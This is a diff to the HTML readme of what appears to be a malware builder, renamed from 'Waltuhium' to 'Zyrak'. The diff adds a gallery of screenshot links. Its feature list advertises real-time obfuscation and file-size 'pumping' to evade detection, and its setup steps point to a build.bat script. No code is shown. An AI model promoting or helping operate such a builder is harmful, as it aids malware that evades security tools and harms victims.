@@ -69,7 +69,7 @@
 </ul>
 
 <h2 id="builder-settings">Builder Settings 🔧</h2>
-<p>Waltuhium builder provides the following options:</p>
+<p>Zyrak builder provides the following options:</p>
 <ul>
   <li>:twisted_rightwards_arrows: <strong>Realtime Obfuscation</strong> - Applies real-time obfuscation techniques.</li>
   <li>:floppy_disk: <strong>File Pumper</strong> (Optional) - Pump your file size to evade detection.</li>
@@ -87,3 +87,18 @@
   <li>:point_right: Navigate to the Zyrak folder and double click <code>build.bat</code>.</li>
   <li>:rocket: Follow the on-screen instructions to complete the setup.</li>
 </ol>
+
+<h2 id="screenshots">Screenshots 📸</h2>
+<img src="https://cdn.discordapp.com/attachments/1238599610763837461/1257072145935241316/image.png?ex=6683132a&is=6681c1aa&hm=3d45d86856d866af64bf1559010ae332492e79536979b2e8c56d3fb9976ea51d&" alt="Application Screenshot">
+<img src="https://cdn.discordapp.com/attachments/1238599610763837461/1257072320384598046/image.png?ex=66831354&is=6681c1d4&hm=95205cdfdfb0af90d798cfb1e1c44775e1de727a85cebf3994f89e8da623fa23&" alt="Application Screenshot">
+<img src="https://cdn.discordapp.com/attachments/1238599610763837461/1257072510479106169/image.png?ex=66831381&is=6681c201&hm=e78100293aae29df483a8e71a1feba8540a147620c8e05958f46dd359e5409d8&" alt="Application Screenshot">
+<img src="https://cdn.discordapp.com/attachments/1238599610763837461/1257072644264820957/image.png?ex=668313a1&is=6681c221&hm=5ce6435a00e4a5d850a9e13f2b62e4a5d3f8e381da2085ca47a68bef33f168fc&" alt="Application Screenshot">
+<img src="https://cdn.discordapp.com/attachments/1238599610763837461/1257077167645261974/image.png?ex=668317d8&is=6681c658&hm=94f4d1465b2a08739ddc6c470c8c9a1033a347d7951eeb0630783bfd08e4739a&" alt="Application Screenshot">
+<img src="https://cdn.discordapp.com/attachments/1238599610763837461/1257078859002679416/image.png?ex=6683196b&is=6681c7eb&hm=d82da97eae148ffaac06083a623f7d6e36cbdc3e60f35e1211d243b3855b6e16&" alt="Application Screenshot">
+<img src="https://cdn.discordapp.com/attachments/1238599610763837461/1257080322357461133/image.png?ex=66831ac8&is=6681c948&hm=736331bba92154dd640323d5c5c67babc3d4b8948b50aad98705a1078e56b6e9&" alt="Application Screenshot">
+<img src="https://i.imgur.com/EbdxRed.png" alt="Application Screenshot">
+<img src="https://camo.githubusercontent.com/d68dcb24f480ccfcd376b6bbedfffec5bbeaf836983ed35636357bb6498bcc30/68747470733a2f2f692e696d6775722e636f6d2f684672797561522e706e67" alt="Application Screenshot">
+
+
+</body>
+</html>
